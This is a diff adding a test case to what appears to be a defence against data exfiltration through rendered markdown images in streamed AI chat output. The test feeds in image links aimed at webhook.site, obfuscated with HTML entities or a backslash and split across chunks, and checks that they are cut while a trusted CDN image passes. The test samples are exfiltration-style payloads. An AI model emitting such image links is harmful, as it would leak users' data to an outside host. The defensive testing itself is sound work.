@@ -185,6 +185,14 @@ describe('ExfilStreamHold', () => {
     expect(hold.push(crlf)).toBe(crlf)
   })
 
+  // #580: a destination the browser decodes (entities, a backslash for a slash)
+  // is held and judged as the client will read it, not as its raw text.
+  it('cuts a destination written with entities or a backslash, split across events (#580)', () => {
+    expect(run(['Chart ![c](https&#58;&#47;&#47;webhook.site/', 'abc?d=1)'])).toBeNull()
+    expect(run(['Chart ![c](https:\\webhook.site/abc?d=1)'])).toBeNull()
+    expect(run(['Chart ![c](https&#58;&#47;&#47;cdn.trusted.com/a.png)'])).not.toBeNull()
+  })
+
   it('does not hold tool-call argument JSON, which is not rendered', () => {
     const hold = new ExfilStreamHold(isExfil)
     expect(hold.push(toolArgs('{"paths": ["a.ts", '))).toBe(toolArgs('{"paths": ["a.ts", '))
